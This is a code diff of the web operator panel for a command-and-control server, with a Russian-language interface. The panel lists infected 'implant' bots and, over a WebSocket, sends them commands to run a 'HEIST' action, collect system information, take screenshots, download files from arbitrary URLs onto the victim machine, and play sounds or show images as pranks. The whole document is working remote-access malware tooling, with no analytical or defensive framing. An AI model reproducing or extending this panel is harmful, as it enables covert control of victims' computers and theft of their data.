@@ -2,7 +2,8 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>C2 Control Panel - Visual Edition</title>  <style>
+    <title>C2 Control Panel - Visual Edition</title>
+    <style>
         body { background-color: #2b2b2b; color: #dcdcdc; font-family: monospace; display: flex; margin: 0; height: 100vh; }
         .sidebar { width: 250px; border-right: 1px solid #444; padding: 10px; display: flex; flex-direction: column; background-color: #313335; }
         .main-content { flex-grow: 1; display: flex; flex-direction: column; }
@@ -22,14 +23,14 @@
         .log-error { color: #ff5555; }
         h3, h4 { border-bottom: 1px solid #444; padding-bottom: 5px; }
 
-        /* --- НОВЫЕ СТИЛИ ДЛЯ КАРТОЧЕК --- */
         .image-card {
             background-color: #3c3f41;
             border: 1px solid #555;
             border-radius: 5px;
             cursor: pointer;
             display: flex;
-            flex-direction: column;       align-items: center;
+            flex-direction: column;
+            align-items: center;
             padding: 10px;
             transition: background-color 0.2s;
         }
@@ -44,7 +45,7 @@
             margin-top: 8px;
             font-size: 12px;
             text-align: center;
-            word-break: break-all; /* Перенос длинных названий */
+            word-break: break-all;
         }
     </style>
 </head>
@@ -53,11 +54,31 @@
         <h3>Боты онлайн:</h3>
         <ul id="bot-list"></ul>
     </div>
+
     <div class="main-content">
         <div class="controls-panel">
             <h3>Управление: <span id="selected-bot-name" style="color: #00e676;">...бот не выбран...</span></h3>
-            <!-- Панель управления остается без изменений -->
+            <div style="display: flex; flex-wrap: wrap; gap: 20px;">
+                <div>
+                    <h4>Системные действия</h4>
+                    <button class="action" onclick="runHeist()">Начать HEIST</button>
+                    <button class="action" onclick="runSysInfo()">Системная информация</button>
+                    <button class="action" onclick="runScreenshot()">Скриншот</button>
+                </div>
+                <div>
+                    <h4>Управление звуком</h4>
+                    <label for="volume-slider">Громкость:</label>
+                    <input type="range" min="0" max="100" value="50" id="volume-slider" oninput="setVolume(this.value)">
+                    <button onclick="toggleMute()">Вкл/Выкл Звук</button>
+                </div>
+                <div>
+                    <h4>Загрузка файлов</h4>
+                    <input type="text" id="download-url" placeholder="URL файла..." style="width: 250px;">
+                    <button onclick="downloadFile()">Загрузить</button>
+                </div>
+            </div>
         </div>
+
         <div class="media-panel">
             <h3>Пранки и Медиа</h3>
             <h4>Локальные звуки</h4>
@@ -65,55 +86,112 @@
             <h4>Локальные изображения</h4>
             <div id="image-files" class="file-grid"></div>
         </div>
+
         <div class="log-panel">
             <div id="log-output"></div>
         </div>
     </div>
 
     <script>
-        // ... (весь JavaScript до функции displayFiles остается без изменений)
-        let ws; let selectedBot = null;
+        let ws;
+        let selectedBot = null;        
         const botList = document.getElementById('bot-list');
         const selectedBotName = document.getElementById('selected-bot-name');
         const logOutput = document.getElementById('log-output');
-        function log(message, isError = false) { const entry = document.createElement('div'); entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`; if (isError) entry.className = 'log-error'; logOutput.prepend(entry); }
+
+        function log(message, isError = false) {
+            const entry = document.createElement('div');
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            if (isError) {
+                entry.className = 'log-error';
+            }
+            logOutput.prepend(entry);
+        }
+
         function connectWs() {
             log("Подключение к C2...");
             const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
             ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
-            ws.onopen = () => { log("Соединение с C2 установлено."); ws.send(JSON.stringify({ type: 'operator' })); };
+
+            ws.onopen = () => {
+                log("Соединение с C2 установлено.");
+                ws.send(JSON.stringify({ type: 'operator' }));
+            };
+
             ws.onmessage = (event) => {
                 const data = JSON.parse(event.data);
                 switch (data.type) {
-                    case 'bot_list': updateBotList(data.data); break;
-                    case 'bot_details': displayBotDetails(data.bot_id, data.data); break;
-                    case 'status': log(`[${selectedBot || 'SERVER'}] ${data.data}`, data.data.startsWith('❌')); break;
+                    case 'bot_list':
+                        updateBotList(data.data);
+                        break;
+                    case 'bot_details':
+                        displayBotDetails(data.bot_id, data.data);
+                        break;
+                    case 'status':
+                        log(`[${selectedBot || 'SERVER'}] ${data.data}`, data.data.startsWith('❌'));
+                        break;
                 }
             };
-            ws.onclose = () => { log("Соединение с C2 потеряно. Переподключение через 5 секунд...", true); setTimeout(connectWs, 5000); };
-            ws.onerror = (e) => log("Ошибка WebSocket. Проверьте консоль браузера (F12).", true);
-        }
-        function updateBotList(bots) { const currentSelected = selectedBot; botList.innerHTML = ''; bots.forEach(botId => { const li = document.createElement('li'); li.textContent = botId.replace('implant_', ''); li.dataset.botId = botId; if (botId === currentSelected) li.classList.add('selected'); li.onclick = () => selectBot(botId, li); botList.appendChild(li); }); if (bots.length > 0 && !bots.includes(currentSelected)) { selectBot(bots[0], botList.firstChild); } else if (bots.length === 0) { selectedBot = null; selectedBotName.textContent = "...бот не выбран..."; } }
-        function selectBot(botId, element) { if (selectedBot) { const oldSelected = botList.querySelector(`li.selected`); if(oldSelected) oldSelected.classList.remove('selected'); } selectedBot = botId; element.classList.add('selected'); selectedBotName.textContent = botId.replace('implant_', ''); log(`Выбран бот: ${selectedBot}`); ws.send(JSON.stringify({ type: 'get_details', target_id: selectedBot })); }
-        function displayBotDetails(botId, details) { if(botId !== selectedBot) return; if (details.volume !== undefined) document.getElementById('volume-slider').value = details.volume; if (details.files) displayFiles(details.files); }
-        function sendCommand(type, payload) { if (!selectedBot) { log("Ошибка: бот не выбран!", true); return; } ws.send(JSON.stringify({ type: type, target_id: selectedBot, payload: payload })); }
-        function setVolume(level) { sendCommand('command', { action: 'volume', level: level }); }
-        function toggleMute() { sendCommand('command', { action: 'mute' }); }
-        function runHeist() { sendCommand('command', { action: 'heist' }); }
-        function runSysInfo() { sendCommand('command', { action: 'sysinfo' }); }
-        function runScreenshot() { sendCommand('command', { action: 'screenshot' }); }
-        function playSound(filename) { sendCommand('command', { action: 'play', filename: filename }); }
-        function showImage(filename) { sendCommand('command', { action: 'show', filename: filename }); }
-        function downloadFile() { const url = document.getElementById('download-url').value; if (!url) { log("URL для загрузки пуст!", true); return; } sendCommand('command', { action: 'download', url: url }); }
 
-        // --- ВОТ, БЛЯДЬ, ГДЕ ПРОИСХОДЯТ ИЗМЕНЕНИЯ ---
+            ws.onclose = () => {
+                log("Соединение с C2 потеряно. Переподключение через 5 секунд...", true);
+                setTimeout(connectWs, 5000);
+            };
+
+            ws.onerror = (e) => {
+                log("Ошибка WebSocket. Проверьте консоль браузера (F12).", true);
+            };
+        }
+
+        function updateBotList(bots) {
+            const currentSelected = selectedBot;
+            botList.innerHTML ='';
+            bots.forEach(botId => {
+                const li = document.createElement('li');
+                li.textContent = botId.replace('implant_', '');
+                li.dataset.botId = botId;
+                if (botId === currentSelected) {
+                    li.classList.add('selected');
+                }
+                li.onclick = () => selectBot(botId, li);
+                botList.appendChild(li);
+            });
+             if (bots.length > 0 && !bots.includes(currentSelected)) {
+                selectBot(bots[0], botList.firstChild);
+            } else if (bots.length === 0) {
+                selectedBot = null;
+                selectedBotName.textContent = "...бот не выбран...";
+            }
+        }
+
+        function selectBot(botId, element) {
+            if (selectedBot) {
+                const oldSelected = botList.querySelector(`li.selected`);
+                if(oldSelected) oldSelected.classList.remove('selected');
+            }
+            selectedBot = botId;
+            element.classList.add('selected');
+            selectedBotName.textContent = botId.replace('implant_', '');
+            log(`Выбран бот: ${selectedBot}`);
+            ws.send(JSON.stringify({ type: 'get_details', target_id: selectedBot }));
+        }
+
+        function displayBotDetails(botId, details) {
+            if(botId !== selectedBot) return;
+            if (details.volume !== undefined) {
+                document.getElementById('volume-slider').value = details.volume;
+            }
+            if (details.files) {
+                displayFiles(details.files);
+            }
+        }
+
         function displayFiles(files) {
             const audioContainer = document.getElementById('audio-files');
             const imageContainer = document.getElementById('image-files');
             audioContainer.innerHTML = '';
             imageContainer.innerHTML = '';
 
-            // Аудио-файлы остаются простыми кнопками
             if (files && files.audio) {
                 files.audio.forEach(filename => {
                     const button = document.createElement('button');
@@ -123,22 +201,16 @@
                     audioContainer.appendChild(button);
                 });
             }
-
-            // А вот изображения мы превращаем в красивые карточки
             if (files && files.image) {
-                files.image.forEach(imageObject => { // Теперь это объект {'filename': ..., 'thumbnail': ...}
-
+                files.image.forEach(imageObject => {
                     const card = document.createElement('div');
                     card.className = 'image-card';
                     card.onclick = () => showImage(imageObject.filename);
 
                     const img = document.createElement('img');
-                    // Проверяем, есть ли у нас миниатюра
                     if (imageObject.thumbnail) {
-                        // Формируем правильный src для Base64
                         img.src = `data:image/jpeg;base64,${imageObject.thumbnail}`;
                     } else {
-                        // Заглушка, если миниатюры нет
                         img.alt = 'no preview';
                     }
 
@@ -150,6 +222,30 @@
                     imageContainer.appendChild(card);
                 });
             }
+        }
+
+        function sendCommand(type, payload) {
+             if (!selectedBot) {
+                log("Ошибка: бот не выбран!", true);
+                return;
+            }
+            ws.send(JSON.stringify({ type: type, target_id: selectedBot, payload: payload }));
+        }
+
+        function setVolume(level) { sendCommand('command', { action: 'volume', level: level }); }
+        function toggleMute() { sendCommand('command', { action: 'mute' }); }
+        function runHeist() { sendCommand('command', { action: 'heist' }); }
+        function runSysInfo() { sendCommand('command', { action: 'sysinfo' }); }
+        function runScreenshot() { sendCommand('command', { action: 'screenshot' }); }
+        function playSound(filename) { sendCommand('command', { action: 'play', filename: filename }); }
+        function showImage(filename) { sendCommand('command', { action: 'show', filename: filename }); }
+        function downloadFile() {
+            const url = document.getElementById('download-url').value;
+            if (!url) {
+                log("URL для загрузки пуст!", true);
+                return;
+            }
+            sendCommand('command', { action: 'download', url: url });
         }
 
         document.addEventListener('DOMContentLoaded', connectWs);
